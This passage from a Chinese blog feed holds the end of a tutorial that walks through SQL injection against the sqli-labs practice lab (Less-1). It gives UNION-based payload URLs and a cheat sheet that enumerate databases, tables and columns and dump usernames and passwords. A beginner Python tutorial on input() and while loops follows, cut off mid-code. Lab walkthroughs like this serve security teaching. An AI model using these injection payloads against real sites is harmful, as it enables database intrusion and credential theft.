&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;　　&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;span&gt;如果是在Mysql数据库中传入畸形参数-比如说单引号，数据库语句就无法执行，会一直处于等待闭合的状态，但是对于SQL执行语句来说，它会认为这是一个错误的SQL语句，并且返回一个错误提示信息。所以此时我们应该闭合单引号或者是注释掉单引号。&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;select  XXX, XXX  from users where id=' 8’  ‘ '  limit 0,1&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231323152-2045858481.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;或者注释掉后面的单引号&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;select  XXX, XXX  from users where id=' 8’  --  '  limit 0,1   （’--  ’ 采用双短线+空格注释后面的语句）&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231356668-2105166479.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;或&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
&lt;span&gt;select  XXX, XXX  from users where id=' 8’  # '  limit 0,1 （采用’#‘注释）
&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231420064-2081758949.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;由上面两幅图可以看出，数据正常返回，说明SQL语句正常执行了，后面的单引号被注释了&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;注意点：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;1、为什么是 ‘--+’ 而不是 ‘—‘&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   因为这里字符 ‘-‘ 和字符 ‘+‘ 在URL中都是有固定的含义的 , 比如说 ‘+’ 就在URL编码中就代表空格 , 而URL编码中 ‘-‘ 不用编码&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;2、为什么 ‘--+’ 没有被URL&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   因为由于这里我们是用+代替了空格, 因此不需要进行编码 , 我们也可以不用 ’+’ 而使用空格的URL编码 , 那么编码得到的URL就应该是 :&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
&lt;span&gt;http://192.168.139.131/sqli-lab/Less-1/?id=8' --%20&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231526896-995483223.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;3、’#’ 又为什么必须得编码，不编码不可以吗？&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   不可以 , 因为 ’#’ 在URL中是有固定的含义的 , 表示页面中的锚点 , 如果不进行编码浏览器就会将其当成页面的锚点 , 而这里我们是需要将其作为数据传输给服务器的 , 因此需要进行URL编码。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231554928-749343498.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;现在我们能控制的字段是id后面传入的参数，然后拼接到原来的SQL语句中执行，所以通过构造传入不同的id参数，达到控制系统内执行我们所需要的SQL语句。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;所以接下来第二步：猜解字段长度&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231759188-1930658107.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107231808999-862154990.png&quot; alt=&quot;&quot;/&gt; &lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=8'  order by 3 --+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;从上面对比可以看出，数据库中字段值为3&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;通过Order by X 判断数据库中字段数，如果X是小于等于数据库中字段值页面则会返回正常数据，如果X大于数据库中字段值也会则会出错&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;SQL UNION 操作符：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
   （1）UNION 操作符用于合并两个或多个 SELECT 语句的结果集

   （2）请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的列的顺序必须相同。默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL

   （3）对于union而言，如果第一个Sql查询语句为错误的话，那么它会将第二个SQL语句的查询结果作为最后的输出
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;第三步：确定数据库中字段在页面上的回显位：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107232032373-961888349.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;使用union联合查询后发现页面返回的数据没变，这是因为如果左边的SQL语句正确执行那么就会只返回左边第一个查询语句的运行结果，那么我们只要让第一行查询的结果是空集（即union左边的select子句查询结果为空），那么我们union右边的查询结果自然就成为了第一行，就打印在网页上了。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这个id传递的是数字，而且一般都是从1开始自增的，我们可以把id值设为非正数（负数或0），浮点数，字符型或字符串都行，主要是使左边的查询语句报错就行。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107232103153-1830297323.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;从上面的union  select 1,2, 3 --+语句的执行结果可以看出第2位和第3位是回显位—是数据库中字段可以显示在页面上的位置&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;所以可以通过替换union  select语句中的第2个字段和第三个字段来查询我们所需要的信息，&lt;/span&gt;&lt;span&gt;如：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
user():      #返回当前数据库连接使用的用户

database():  #返回当前数据库连接使用的数据库

version():   #返回当前数据库的版本

@@datadir             #数据库路径

@@version_compile_os  #操作系统版本
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union  select 1,database(), user() --+
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233502845-1046274494.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;34&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union  select 1,@@datadir, @@version --+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233535233-1474316951.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;从上面可以看到，通过页面回显位显示出特定的所需要的值，包括数据库用户，物理路径等&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    在数据库中执行查询语句时，如果页面显示位比较少，又不想重复性操作，这时我们就用到数据库的连接函数了，常用的就concat和concat_ws,其中concat_ws的第一个参数是连接字符串的分隔符，还会用到group_concat(可以把查询出来的多行连接起来)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;具体连接函数用法详情请参考：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
https://www.cnblogs.com/yingmo/p/6148360.html
&lt;/pre&gt;&lt;/div&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;36&quot;&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;42&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  UNION SELECT 1,2,concat_ws(char(32,58,32),user(),database(),version(),@@datadir,@@version_compile_os) --+
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233605203-1932549702.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;查询数据库&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    SQL注入核心就是找到当前数据库，由上图可以看出当前数据库是security，当然还可以看到当前连接数据库的用户是root，因为root权限比较高，我们不仅可以查看到自己当前的数据看还可以看到其他的数据库信息。&lt;/span&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233633418-2090915563.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在找到当前的数据库后，如果还想看下其他的数据库的内容，可以用这个语句查询所有的数据库:&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  UNION SELECT 1,2,group_concat(schema_name) from  information_schema.schemata --+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233654162-353938414.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;接下来查询security数据库中有哪些表&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;首先说一下mysql的数据库information_schema，他是系统数据库，安装完就有，记录是当前数据库的数据库，表，列，用户权限等信息，下面说一下常用的几个表&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
    （1）SCHEMATA表:储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等，show databases的结果取之此表。

　　（2）TABLES表:储存mysql中的表信息，（当然也有数据库名这一列，这样才能找到哪个数据库有哪些表嘛）包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。show tables from schemaname的结果取之此表

　　（3）COLUMNS表：提供了表中的列信息，（当然也有数据库名和表名称这两列）详细表述了某张表的所有列以及每个列的信息，包括该列是那个表中的第几列，列的数据类型，列的编码类型，列的权限，猎德注释等。是show columns from schemaname.tablename的结果取之此表。 
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;详细请看：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
http://wenku.baidu.com/link?url=bIA38Slp-g2Bob4VDuTSVY8e04Beqq9Xac4I90UMC9ziQuzxiukpEh5abPK-woB9tuQ4DuY_KhKW-eTHH6ACSiMJmRhctiHvijOEFmENBbS
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;查询数据库security&lt;/strong&gt;&lt;strong&gt;中的数据表信息&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union select 1,2,group_concat(table_name) from  information_schema.tables  where  table_schema=database() --+    
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;或者&lt;/span&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union select 1,2,group_concat(table_name) from  information_schema.tables  where  table_schema='security'--+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;这里的database()函数进行了数据库查询，因为我们已经查到了当前的数据库为security，所有这里还可以用单引号括把数据库的名称用单引号括起来'security'。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233722561-1091494244.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;还可以通过hex编码数据库名，当然如果嫌麻烦的话这里还可以直接将数据表用hex编码，Firefox自带的hackbar插件就有。注hex编码后在前面加上0x表明这里是16进制编码。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union select 1,2,group_concat(table_name) from  information_schema.tables  where  table_schema=0x7365637572697479 --+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233800809-1539336032.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233820820-1171998185.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;因为我们进行SQL注入时一般是查找用户登录信息，包括用户名密码等信息，所以根据数据特性，一般用户名字段都是放在user表中&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;查询数据表user&lt;/strong&gt;&lt;strong&gt;中的数据列信息：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union select 1,2,group_concat(column_name)  from  information_schema.columns  where  table_name='users'--+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107233923104-436260020.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;根据列查询特定字段值：&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;知道了数据库、表名、各个字段名可以直接进行查询了，不需借助information_schanem数据库了。&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;40&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  UNION SELECT 1,2,group_concat(char(32,58,32),id,username,password) from users --+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107234030536-771885854.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
&lt;pre class=&quot;brush:sql;gutter:true;&quot;&gt;
http://192.168.139.131/sqli-lab/Less-1/?id=-8'  union select 1,username,password from users where id =2--+
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1324118/201901/1324118-20190107234112240-770749041.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   也许很多人可能会想，这里和开始有什么区别吗？只要我在开始的时候修改那个参数id的值，岂不就可以获取其他的字段信息了吗？何必如此呢？但是如果你这么想，那么你忽略了一点就是，之前的情况下，你是不知道表名的。你只可以查询指定的数据库、表名、字段信息，但是现在你可以进行修改，查询其他系统的数据库的信息了！&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;简单的对之前的信息进行整理：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;47&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
order by -- + 判断字段数目

union select  -- + 联合查询收集信息

id=1′ and 1=2 UNION SELECT 1,2,database()  -- + 查询当前数据库

id=1’ and 1=2 UNION SELECT 1,2,group_concat(schema_name) from information_schema.schemata  -- +查询所有数据库

id=1′ and 1=2 UNION SELECT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()  -- +查询表名

id=1′ and 1=2 UNION SELECT 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’  -- +  查询列名

id=1′ and 1=2 UNION SELECT 1,2,group_concat(id,username,password) from users   -- + 查询字段值
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;&lt;span&gt;参考链接：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;33&quot;&gt;
&lt;pre class=&quot;brush:html;gutter:true;&quot;&gt;
https://www.freebuf.com/articles/web/160352.html

https://blog.csdn.net/u012763794/article/details/51207833#

https://blog.csdn.net/Fly_hps/article/details/80234840?utm_source=blogxgwz1
&lt;/pre&gt;&lt;/div&gt;

</description>
<pubDate>Mon, 07 Jan 2019 15:58:00 +0000</pubDate>
<dc:creator>无缘の邂逅#</dc:creator>
<og:description>环境准备： Phpstudy （PHP+Apache+Mysql） Sql-lab 首先了解下基础知识： URL编码： 因为在浏览器中，当我们访问一个网址的时候，浏览器会自动将用户输入的网址进行URL</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/csyxf/p/10235785.html</dc:identifier>
</item>
<item>
<title>Python基础之While循环 - davieyang</title>
<link>http://www.cnblogs.com/davieyang/p/10236646.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/davieyang/p/10236646.html</guid>
<description>&lt;h2&gt;一、摘要&lt;/h2&gt;
&lt;p&gt;本片博文将介绍input()函数和while循环的使用&lt;/p&gt;
&lt;h2&gt;二、input()函数&lt;/h2&gt;
&lt;p&gt;函数input() 让程序暂停运行，等待用户输入一些文本。获取用户输入后，Python将其存储在一个变量中，以方便你使用。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
message = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Tell me something, and I will repeat it back to you: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(message)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;函数input() 接受一个参数：即要向用户显示的提示 或说明，让用户知道该如何做。在这个示例中，Python运行第1行代码时，用户将看到提示Tell me something, and I will repeat it back to you: 程序等待用户输入，并在用户按回车键后继续运行。输入存储在变量message 中，接下来的print(message) 将输入呈现给用户，有时候，提示可能超过一行，例如，你可能需要指出获取特定输入的原因。在这种情况下，可将提示存储在一个变量中，再将该变量传递给函数input() 。这样，即便提示超过一行，input() 语句也非常清晰。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
prompt = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;If you tell us who you are, we can personalize the messages you see.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
prompt &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nWhat is your first name? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
name &lt;/span&gt;=&lt;span&gt; input(prompt)
&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nHello, &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + name + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;使用函数input() 时，Python将用户输入解读为字符串。请看下面让用户输入其年龄的解释器会话：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; age = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;How old are you? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
How old are you&lt;/span&gt;? &lt;span&gt;21&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt;&lt;span&gt; age
&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;用户输入的是数字21，但我们请求Python提供变量age 的值时，它返回的是'21' ——用户输入的数值的字符串表示，是个字符串自然就不能当作数字来使用，否则会报TypeError，我们如果要当作数字来使用，就需要使用int()函数来转换&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&amp;gt;&amp;gt;&amp;gt; age = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;How old are you? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
How old are you&lt;/span&gt;? &lt;span&gt;21&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; age = &lt;span&gt;int&lt;/span&gt;&lt;span&gt;(age)
&lt;/span&gt;&amp;gt;&amp;gt;&amp;gt; age &amp;gt;= &lt;span&gt;18&lt;/span&gt;&lt;span&gt;
True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
height = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;How tall are you, in inches? &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
height &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;&lt;span&gt;(height)
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; height &amp;gt;= &lt;span&gt;36&lt;/span&gt;&lt;span&gt;:
　　print(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nYou're tall enough to ride!&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
　　print(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nYou'll be able to ride when you're a little older.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
number = input(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Enter a number, and I'll tell you if it's even or odd: &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
number &lt;/span&gt;= &lt;span&gt;int&lt;/span&gt;&lt;span&gt;(number)
&lt;/span&gt;&lt;span&gt;if&lt;/span&gt; number % &lt;span&gt;2&lt;/span&gt; == &lt;span&gt;0&lt;/span&gt;&lt;span&gt;:
　　print(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nThe number &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + str(number) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; is even.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;:
　　print(&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nThe number &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; + str(number) + &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt; is odd.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;三、while循环&lt;/h2&gt;
&lt;p&gt;while 循环不断地运行，直到指定的条件不满足为止&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
current_number = 1
&lt;span&gt;while&lt;/span&gt; current_number &amp;lt;= 5&lt;span&gt;:
　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;&lt;span&gt;(current_number)
　　current_number &lt;/span&gt;+= 1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;只要current_number 小于或等于5，就接着运行这个循环。循环中的代码打印current_number 的值，再使用代码current_number += 1 （代码current_number = current_number + 1 的简写）将其值加1。只要满足条件current_number &amp;lt;= 5 ，Python就接着运行这个循环。由于1小于5，因此Python打印1 ，并将current_number 加1，使其为2 ；由于2小于5，因此Python打印2 ，并将current_number 加1 ，使其为3 ，以此类推。一旦current_number 大于5，循环将停止，整个程序也将到此结束&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
prompt = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nTell me something, and I will repeat it back to you:&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
prompt &lt;/span&gt;+= &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;\nEnter 'quit' to end the program. &lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;
message &lt;/span&gt;= &lt;span&gt;&quot;&quot;&lt;/span&gt;
&lt;span&gt;while&lt;/span&gt; message != &lt;span&gt;'&lt;/span&gt;&lt;span&gt;quit&lt;/span&gt;&lt;span&gt;'&lt;/span&gt;&lt;span&gt;:
　　message &lt;/span&gt;=&lt;span&gt; input(prompt)
　　&lt;/span&gt;&lt;span&gt;print&lt;/span&gt;(message)
